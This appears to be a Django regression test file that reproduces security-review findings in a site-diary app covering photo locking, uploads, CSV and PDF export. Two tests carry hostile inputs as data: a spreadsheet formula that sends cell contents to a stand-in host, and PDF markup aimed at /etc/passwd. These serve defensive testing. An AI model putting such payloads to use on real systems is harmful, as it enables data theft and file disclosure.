"""Reproductions from the independent review, kept as regression tests."""
import io
from datetime import timedelta

from django.core.files.base import ContentFile
from django.contrib.auth import get_user_model
from PIL import Image
from django.core.files.uploadedfile import SimpleUploadedFile

from core.models import AuditEntry
from tenancy.context import org_context

from ..models import DelayLine, SitePhoto
from .test_diary import DiaryTestBase, jpeg


class ReviewRepro(DiaryTestBase):
    def test_locked_day_photo_details_cannot_be_changed(self):
        old = self.old_entry()
        with org_context(self.org_a):
            self.assertTrue(old.locked)
        p = self.photo(entry=old)
        self.login(self.sam)  # site manager, not the PM
        r = self.client.post(self.url('diary_photo', self.pa.pk, p.pk), {
            'caption': 'REWRITTEN AFTER LOCK', 'area': 'Elsewhere', 'taken_on': self.today.isoformat(),
            'shared_with_client': 'on'})
        with org_context(self.org_a):
            p.refresh_from_db()
        self.assertNotEqual(p.caption, 'REWRITTEN AFTER LOCK', 'caption of a photo on a locked day was changed')
        self.assertNotEqual(p.taken_on, self.today, 'locked-day photo re-dated')

    def test_truncated_jpeg_is_a_form_error_not_a_500(self):
        buf = io.BytesIO()
        Image.new('RGB', (2000, 1500), 'blue').save(buf, 'JPEG')
        data = buf.getvalue()[: len(buf.getvalue()) // 2]
        self.login(self.pat)
        self.client.raise_request_exception = False
        r = self.client.post(self.url('diary_photo_upload', self.pa.pk), {
            'library': SimpleUploadedFile('half.jpg', data, content_type='image/jpeg'),
            'taken_on': self.today.isoformat(), 'attach': ''})
        self.assertEqual(r.status_code, 200, f'got {r.status_code}')

    def test_csv_logged_by_name_is_neutralised(self):
        self.pat.full_name = '=HYPERLINK("http://evil.test/?"&A1,"x")'
        self.pat.save()
        self.login(self.pat)
        self.client.post(self.url('diary_line_add', self.pa.pk, self.today.isoformat(), 'delays'),
                         {'cause': 'WEATHER', 'hours_lost': '2', 'description': 'rain'})
        r = self.client.get(self.url('diary_delays', self.pa.pk) + '?export=csv')
        body = r.content.decode()
        self.assertNotIn(',=HYPERLINK', body.replace('"', ''), body)

    def test_client_never_gets_original_when_display_missing(self):
        p = self.photo(shared=True)
        with org_context(self.org_a):
            SitePhoto.objects.filter(pk=p.pk).update(display='', thumbnail='')
        self.login(self.carla)
        r = self.client.get(self.url('diary_photo_file', self.pa.pk, p.pk, 'display'))
        self.assertNotEqual(r.status_code, 200, 'client was served the original file')

    def test_jpeg_comment_not_copied_to_display(self):
        buf = io.BytesIO()
        Image.new('RGB', (400, 300)).save(buf, 'JPEG', comment=b'GPS 53.80N 1.55W home address')
        with org_context(self.org_a):
            p = SitePhoto(project=self.pa, uploaded_by=self.pat)
            from ..photos import attach
            attach(p, SimpleUploadedFile('c.jpg', buf.getvalue()))
            p.save()
            self.assertNotIn(b'home address', p.display.read())

    def test_photo_cannot_be_future_dated(self):
        p = self.photo()
        self.login(self.pat)
        self.client.post(self.url('diary_photo', self.pa.pk, p.pk), {
            'caption': 'x', 'area': '', 'taken_on': (self.today + timedelta(days=400)).isoformat()})
        with org_context(self.org_a):
            p.refresh_from_db()
        self.assertLessEqual(p.taken_on, self.today)


class ReviewRepro2(DiaryTestBase):
    def test_pdf_markup_is_printed_not_obeyed(self):
        self.login(self.pat)
        self.client.post(self.url('diary_line_add', self.pa.pk, self.today.isoformat(), 'delays'),
                         {'cause': 'WEATHER', 'hours_lost': '2',
                          'description': '<img src="/etc/passwd" width="10" height="10"/> <font color="red">x</font> & <b>'})
        r = self.client.get(self.day_url('diary_pdf'))
        self.assertEqual(r.status_code, 200)

    def test_pdf_with_a_long_delay_description(self):
        self.login(self.pat)
        self.client.post(self.url('diary_line_add', self.pa.pk, self.today.isoformat(), 'delays'),
                         {'cause': 'WEATHER', 'hours_lost': '2', 'description': 'Rain stopped work on the roof. ' * 400})
        self.client.raise_request_exception = False
        r = self.client.get(self.day_url('diary_pdf'))
        self.assertEqual(r.status_code, 200, f'got {r.status_code}')

    def test_date_min_is_404_not_500(self):
        self.login(self.pat)
        self.client.raise_request_exception = False
        r = self.client.get(self.url('diary_day', self.pa.pk, '0001-01-01'))
        self.assertEqual(r.status_code, 404, f'got {r.status_code}')
